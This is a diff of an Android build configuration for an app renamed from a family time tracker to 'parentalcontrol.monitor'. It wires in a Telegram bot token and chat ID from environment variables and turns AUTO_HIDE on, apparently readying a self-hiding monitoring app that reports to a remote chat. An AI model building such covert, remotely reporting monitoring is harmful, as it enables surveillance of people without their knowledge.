@@ -9,7 +9,7 @@ android {
     compileSdk 34
 
     defaultConfig {
-        applicationId "com.family.timetracker"
+        applicationId "com.parentalcontrol.monitor"
         minSdk 27
         targetSdk 34
         versionCode 1
@@ -19,10 +19,10 @@ android {
             huaweiAppId: "your_huawei_app_id_here"
         ]
         
-        // BuildConfig constants - TESTING MODE (No Telegram required)
-        buildConfigField "String", "TELEGRAM_BOT_TOKEN", '""'  // Empty for testing
-        buildConfigField "String", "TELEGRAM_CHAT_ID", '""'    // Empty for testing
-        buildConfigField "boolean", "AUTO_HIDE", "false"       // Don't hide during testing
+        // Build config fields for environment variables
+        buildConfigField "String", "TELEGRAM_BOT_TOKEN", "\"${System.getenv('TELEGRAM_BOT_TOKEN') ?: 'your_bot_token_here'}\""
+        buildConfigField "String", "TELEGRAM_CHAT_ID", "\"${System.getenv('TELEGRAM_CHAT_ID') ?: 'your_chat_id_here'}\""
+        buildConfigField "boolean", "AUTO_HIDE", "true"
     }
 
     buildTypes {
